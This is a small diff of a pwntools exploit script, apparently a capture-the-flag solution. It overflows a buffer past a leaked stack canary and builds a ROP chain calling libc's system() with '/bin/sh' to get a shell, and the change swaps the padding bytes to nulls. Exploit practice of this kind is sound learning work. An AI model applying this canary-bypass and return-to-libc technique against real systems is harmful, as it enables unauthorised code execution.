@@ -62,7 +62,7 @@ libc.address = libc_off
 rop = ROP(libc)
 rop.system(libc_off + binsh_off)
 
-p.sendline(b'#' + b'a' * 1000103 + p64(canary) + b'a' * 0x8 + rop.chain())
+p.sendline(b'\x00' * 1000104 + p64(canary) + b'a' * 0x8 + rop.chain())
 
 #pray for flag
 
